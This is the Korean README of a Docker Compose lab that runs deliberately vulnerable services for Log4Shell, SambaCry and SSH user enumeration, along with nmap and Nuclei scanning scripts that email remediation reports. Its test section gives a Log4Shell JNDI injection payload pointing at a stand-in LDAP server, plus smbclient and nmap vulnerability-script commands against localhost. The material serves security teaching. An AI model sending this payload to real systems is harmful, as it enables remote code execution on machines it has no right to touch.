# vuln-lab 🔬

Docker Compose 기반 취약점 실습 환경. 세 가지 실제 CVE를 로컬에서 안전하게 분석할 수 있습니다.

## 포함된 취약점

| CVE | 이름 | CVSS | 접속 포트 |
|-----|------|------|-----------|
| CVE-2021-44228 | Log4Shell | 10.0 (Critical) | `localhost:9080` |
| CVE-2017-7494  | SambaCry  |  9.8 (Critical) | `localhost:9081` (웹 UI) / `1445` (SMB) |
| CVE-2018-15473 | SSH User Enumeration | 5.3 (Medium) | `localhost:9082` (웹 UI) / `2222` (SSH) |

## 빠른 시작

```bash
git clone https://github.com/s0yeon25/vuln-lab.git
cd vuln-lab
docker compose up --build -d
```

> 첫 실행 시 이미지 빌드에 몇 분 소요될 수 있습니다.

## 접속 주소

| 서비스 | 브라우저 접속 URL | 설명 |
|--------|------------------|------|
| Log4Shell | http://localhost:9080 | 취약한 Spring Boot 앱 |
| SambaCry UI | http://localhost:9081 | SMB 서비스 상태 및 분석 가이드 |
| SSH Enum UI | http://localhost:9082 | SSH 서비스 상태 및 분석 가이드 |

## 스캐너 실행

### 1. 포트 및 서비스 스캔 (scanner.py)

nmap을 이용해 열린 포트, 서비스 종류, OS 정보를 출력합니다.

```bash
python scanner.py
```

### 2. CVE 탐지 및 조치 보고서 (os_nuclei_scanner.py)

TTL 기반 OS 추정, Nuclei CVE 자동 탐지, 관리자 조치 보고서 출력, 이메일 자동 전송을 수행합니다.

```bash
python os_nuclei_scanner.py
```

실행 시 아래 순서로 동작합니다.
1. TTL 값으로 OS 추정 (TTL 64 → Linux / TTL 128 → Windows)
2. Nuclei로 CVE 자동 탐지
3. 탐지된 CVE 요약 출력
4. CVE별 조치 방법 보고서 출력
5. 관리자 이메일로 보고서 자동 전송

#### 이메일 전송 설정

Gmail 앱 비밀번호 발급
1. `https://myaccount.google.com/security` 에서 2단계 인증 활성화
2. `https://myaccount.google.com/apppasswords` 에서 앱 비밀번호 발급 (16자리)

`os_nuclei_scanner.py` 에서 아래 부분 수정
```python
SENDER_EMAIL = "본인Gmail@gmail.com"
APP_PASSWORD  = "발급받은16자리앱비밀번호"
```

수신자 이메일 설정 (파일 하단 main 블록)
```python
send_email_report(nuclei_results, "받는사람이메일@gmail.com")
```

## 각 취약점 테스트

### Log4Shell (CVE-2021-44228)
```bash
# JNDI Lookup 트리거 (X-Api-Version 헤더 활용)
curl -H 'X-Api-Version: ${jndi:ldap://your-ldap-server/a}' http://localhost:9080/
```

### SambaCry (CVE-2017-7494)
```bash
# 공유 목록 확인
smbclient -L //localhost -p 1445 -N
# 공유 접속
smbclient //localhost/share -p 1445 -N
# nmap 취약점 스캔
nmap -p 1445 --script smb-vuln-cve-2017-7494 localhost
```

### SSH User Enumeration (CVE-2018-15473)
```bash
# SSH 접속 테스트
ssh -p 2222 testuser@localhost
# nmap 스캔
nmap -p 2222 --script ssh-auth-methods localhost
```

## 중지

```bash
docker compose down
```

## ⚠️ 주의사항

- 이 환경은 **교육/연구 목적**으로만 사용하세요.
- 외부 네트워크에 노출하지 마세요.
- 실제 운영 환경에서 사용 금지.
